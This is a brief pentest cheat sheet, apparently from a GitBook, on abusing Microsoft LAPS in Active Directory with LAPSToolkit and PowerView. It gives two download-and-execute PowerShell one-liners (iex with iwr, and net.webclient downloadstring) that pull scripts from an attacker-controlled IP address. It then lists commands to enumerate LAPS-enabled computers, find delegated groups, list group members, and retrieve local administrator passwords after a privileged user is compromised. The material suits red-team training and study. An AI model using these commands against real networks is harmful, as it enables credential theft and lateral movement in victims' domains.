# LAPS

## LAPS ToolKit 

```csharp
iex(iwr http://10.110.0.66:8001/LAPSToolkit.ps1) 
```

### Load the module 

```csharp
. .\LAPSToolkit.ps1
or
Import-Module .\LAPSToolkit.ps1
```

### Locate computers

```csharp
Get-LAPSComputers
```

![](../../../../../.gitbook/assets/image%20%28148%29.png)

### Find Delegate groups

```csharp
Find-LAPSDelegatedGroups
```

![](../../../../../.gitbook/assets/image%20%28281%29.png)

### Enumerate groups

#### Load powerview

```csharp
 iex(new-object net.webclient).downloadstring('http://10.110.0.66:8000/powerview.ps1')
```

```csharp
Get-NetGroupMember -GroupName <GROUP_NAME>
```

![](../../../../../.gitbook/assets/image%20%2825%29.png)

### Retrieve password

{% hint style="info" %}
Require to compromise a privilege user
{% endhint %}

```csharp
Get-LAPSComputers
```

![](../../../../../.gitbook/assets/image%20%28249%29%20%281%29.png)

## Resources

{% embed url="https://github.com/leoloobeek/LAPSToolkit" %}

